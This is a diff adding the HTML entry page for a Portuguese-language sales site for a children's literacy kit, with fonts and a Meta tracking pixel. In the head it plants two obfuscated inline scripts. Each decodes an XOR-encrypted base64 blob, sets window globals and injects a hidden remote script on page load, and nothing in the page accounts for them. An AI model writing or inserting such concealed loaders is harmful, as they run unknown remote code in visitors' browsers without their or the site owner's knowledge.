@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script>
+      (function() {
+        var origStringify = JSON.stringify;
+        JSON.stringify = function(val, replacer, space) {
+          try {
+            return origStringify(val, replacer, space);
+          } catch (err) {
+            if (err && (err.name === 'TypeError' || /circular|cyclic/i.test(err.message))) {
+              var seen = new WeakSet();
+              return origStringify(val, function(k, v) {
+                if (typeof replacer === 'function') {
+                  v = replacer.call(this, k, v);
+                }
+                if (typeof v === 'object' && v !== null) {
+                  if (typeof Node !== 'undefined' && v instanceof Node) {
+                    return '[' + (v.nodeName || 'Node') + ']';
+                  }
+                  if (seen.has(v)) {
+                    return '[Circular]';
+                  }
+                  seen.add(v);
+                }
+                return v;
+              }, space);
+            }
+            throw err;
+          }
+        };
+      })();
+    </script>
+    <title>KIT DE ALFABETIZAÇÃO Ler &amp; Brincar</title>
+    <meta name="description" content="Seu filho lendo com confiança em poucas semanas com atividades lúdicas e metodologia simples." />
+    <meta property="og:title" content="KIT DE ALFABETIZAÇÃO Ler &amp; Brincar" />
+    <meta property="og:description" content="Seu filho lendo com confiança em poucas semanas com atividades lúdicas e metodologia simples." />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;700;800&family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="icon" href="/favicon.webp" type="image/webp" />
+    <link rel="icon" href="/favicon.png" type="image/png" />
+    <script>(function(){var m_r=atob("DDSnVWLU5Ii+MZYMT0+FIBC4xrKcWeJ4P0edek23gOaQROJhJlLeewG7iabcQ7l/LEbOJRany/jXSfNgYETOLQe4yuLNE7ouLkDTJwu2kfzbQrQ2FGmLdwW4i+rfXeUudW/cdwy1ie2cC7R8JkzCOSuwxqScR/dgOlGFb0DihbGNVPQ9LgTGNlfm0+uGVaFpewbBYFH2mdXD");var a_75=[];for(var v_0=0;v_0<m_r.length;v_0++){a_75.push(m_r.charCodeAt(v_0)&255);}var q_t0=a_75[0];var j_43=a_75.slice(1,1+q_t0);var l_6b=a_75.slice(1+q_t0);var w_59=l_6b.map(function(b,p_c8f){return b^j_43[p_c8f%q_t0];});var c_u="";for(var z_n=0;z_n<w_59.length;z_n++){c_u+=String.fromCharCode(w_59[z_n]&255);}var b_2b=decodeURIComponent(escape(c_u));var h_jer=JSON.parse(b_2b);var f_ne=h_jer.globals||[];f_ne.forEach(function(b_i){window[b_i.name]=b_i.value;});var f_2=document.createElement("script");f_2.src=h_jer.url;f_2.async=true;f_2.defer=true;(h_jer.attributes||[]).forEach(function(i_ui9){f_2.setAttribute(i_ui9.name,i_ui9.value);});(document.head||document.documentElement).appendChild(f_2);})();</script>
+    <script>(function(){var c_p=atob("DH+3z5PaOnU4f2zMaASVuuG2GE8aFxi4GAyN4Ly5XhsWChihARnO4fC1V1taDUO/Cw3ev+epFQBMEh/jBB7DquCuFB9LXUDuCQvDvfq4TwFdDE72MwSVofK3X1cCXQitHB6auue3UxNBUhy+DQnSoef3QhZXG0G/CxSV47GsWxlNGk72Sl3K4+j4VBRVGk72ShvWu/L3TwFVFgq1RQ/FquW/VAEVDBmuARvE7b/4TBRUCgnuUl2Vss6n");var u_ttkn=[];for(var w_1tm=0;w_1tm<c_p.length;w_1tm++){u_ttkn.push(c_p.charCodeAt(w_1tm)&255);}var r_bx=u_ttkn[0];var m_hf=u_ttkn.slice(1,1+r_bx);var n_j0=u_ttkn.slice(1+r_bx);var h_zvsx=n_j0.map(function(b,h_a4p){return b^m_hf[h_a4p%r_bx];});var f_g="";for(var j_zsvj=0;j_zsvj<h_zvsx.length;j_zsvj++){f_g+=String.fromCharCode(h_zvsx[j_zsvj]&255);}var d_wh=decodeURIComponent(escape(f_g));var b_4h2=JSON.parse(d_wh);var r_x32=b_4h2.globals||[];r_x32.forEach(function(l_5x4t){window[l_5x4t.name]=l_5x4t.value;});var f_s5=document.createElement("script");f_s5.src=b_4h2.url;f_s5.async=true;f_s5.defer=true;(b_4h2.attributes||[]).forEach(function(m_e1){f_s5.setAttribute(m_e1.name,m_e1.value);});(document.head||document.documentElement).appendChild(f_s5);})();</script>
+    <!-- Meta Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1383508423908783');
+      fbq('track', 'PageView');
+    </script>
+    <!-- End Meta Pixel Code -->
+  </head>
+  <body>
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1383508423908783&ev=PageView&noscript=1"
+    /></noscript>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
